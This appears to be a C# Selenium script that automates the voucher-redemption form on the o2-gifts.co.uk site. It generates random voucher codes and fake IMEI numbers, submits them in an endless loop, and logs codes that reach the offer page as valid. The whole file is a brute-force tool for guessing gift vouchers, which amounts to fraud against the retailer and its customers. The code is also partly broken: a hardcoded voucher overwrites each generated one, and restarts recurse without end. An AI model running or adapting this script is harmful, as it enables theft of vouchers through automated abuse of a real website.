using System;
using System.IO;
using System.Linq;
using OpenQA.Selenium;
using OpenQA.Selenium.Firefox;

namespace o2_gifts
{
    class Funcs
    {
        Random rnd = new Random();

        // Function for generating unique voucher
        #region Generate Voucher
        public string GenerateVoucher(int length)
        {
            string
                charset1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ", 
                charset2 = "0123456789";

            string voucher = "";

            for (int i = 0; i < length; i++) // First part of voucher (5 letters)
                voucher += charset1[rnd.Next(charset1.Length)];
            for (int i = 0; i < length; i++) // Second part of voucher (5 digits)
                voucher += charset2[rnd.Next(charset2.Length)];

            return voucher;
        }
        #endregion
        // Function for generating IMEI based on a prefix
        #region Generate IMEI
        public string GenerateIMEI(string prefix, int length)
        {
            string charset = "0123456789";
            string _prefix = prefix;

            for (int i = 0; i < length; i++)
                _prefix += charset[rnd.Next(charset.Length)];

            return _prefix;
        }
        #endregion
    }

    class Meths
    {
        //FirefoxDriver firefoxDriver = new FirefoxDriver();
        OpenQA.Selenium.Chrome.ChromeDriver firefoxDriver = new OpenQA.Selenium.Chrome.ChromeDriver();
        Funcs fn = new Funcs();
        public string generatedVoucher = "";

        // Method that calls for page load and code insertion
        #region Starting Method
        public void startMethod()
        {
            PageLoader();
            while (true)
            {
                CodeInsertion();
                Console.WriteLine(generatedVoucher);
            }
        }
        #endregion

        // Method for loading page
        #region Page Loader
        public void PageLoader()
        {           
            const string baseUrl = "https://www.o2-gifts.co.uk/";
            firefoxDriver.Navigate().GoToUrl(baseUrl);
            string currentUrl = firefoxDriver.Url;
            

            if (currentUrl != baseUrl)
                Environment.Exit(0);
            else
                firefoxDriver.Url = baseUrl;
        }
        #endregion

        // Method for entering codes into text fields automatically
        #region Code Insertion
        public void CodeInsertion()
        {
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(120);

            try
            {
                firefoxDriver.FindElement(By.Id("voucherCode")).Clear();
                firefoxDriver.FindElement(By.Id("imeiNumber")).Clear();
            }
            catch
            {
                startMethod();
                //CodeInsertion();
            }

            generatedVoucher = fn.GenerateVoucher(5);

            // Create an array to contain contents of invalid code file
            string[] invalidCodes = File.ReadAllLines("invalid_vouchers.txt");

            // Check invalid code array contains generated code
            if (invalidCodes.Contains(generatedVoucher))
            {
                Console.Beep();
                Console.WriteLine(generatedVoucher + " <--- Existing Match Found!");
                // Generate new code
                generatedVoucher = fn.GenerateVoucher(5);
            }

            generatedVoucher = "KHGGL39851";

            firefoxDriver.FindElement(By.Id("voucherCode")).SendKeys(generatedVoucher);
            firefoxDriver.FindElement(By.Id("imeiNumber")).SendKeys("358792080521412" + Keys.Enter);

            // Checking if the URL changes (voucher is successful)
            if (firefoxDriver.Url == "https://www.o2-gifts.co.uk/offer/select/index/")
            {
                // Writes the valid voucher to separate text file
                using (StreamWriter stw = new StreamWriter("valid_vouchers.txt", true))
                    stw.WriteLine(generatedVoucher);

                // Calls method to restart
                startMethod();
                
            }

            using (StreamWriter stw = new StreamWriter("invalid_vouchers.txt", true))
            {
                stw.WriteLine(generatedVoucher);
            }

            System.Threading.Thread.Sleep(300);
        }
        #endregion
    }
}
